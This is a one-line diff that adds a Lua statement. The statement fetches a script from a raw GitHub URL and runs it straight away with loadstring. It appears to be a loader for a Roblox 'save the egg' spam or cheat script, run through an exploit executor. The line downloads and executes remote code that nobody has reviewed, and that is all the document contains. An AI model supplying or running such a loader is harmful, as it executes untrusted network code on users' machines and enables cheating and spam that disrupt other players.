@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/save-the-egg-spam3-7yll7d9rn5wwc5.lua"))()
